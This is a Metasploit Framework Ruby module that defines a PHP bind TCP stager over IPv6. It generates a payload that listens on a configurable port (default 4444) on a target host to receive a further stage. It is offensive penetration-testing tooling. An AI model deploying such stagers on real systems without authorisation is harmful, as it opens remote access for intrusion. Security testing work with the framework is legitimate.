##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Php

  def self.handler_type_alias
    "bind_tcp_ipv6"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager IPv6',
      'Description'   => 'Listen for a connection over IPv6',
      'Author'        => ['egypt'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::BindTcp,
      'Stager'        => { 'Payload' => "" }
      ))
  end
  def generate
    if (datastore['LPORT'] and not datastore['LPORT'].empty?)
      lport = datastore['LPORT']
    else
      lport = '4444'
    end

    bind = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'bind_tcp_ipv6.php'))
    bind.gsub!("4444", lport)

    return super + bind
  end

  #
  # PHP's read functions suck, make sure they know exactly how much data to
  # grab by sending a length.
  #
  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end
end
